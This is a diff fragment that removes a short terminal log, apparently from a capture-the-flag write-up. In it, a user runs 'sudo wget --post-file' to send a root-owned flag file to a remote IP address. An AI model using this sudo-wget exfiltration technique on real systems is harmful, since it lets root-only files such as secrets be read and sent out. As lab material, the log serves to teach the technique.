@@ -1,8 +1,0 @@
-jessie@CorpOne:/$ sudo wget --post-file=/root/root_flag.txt 10.13.21.49:80
---2021-08-08 00:14:25--  http://10.13.21.49/
-Connecting to 10.13.21.49:80... connected.
-HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9
-Length: unspecified
-Saving to: ‘index.html’
-
-index.html            [   <=>      ]       1  --.-KB/s
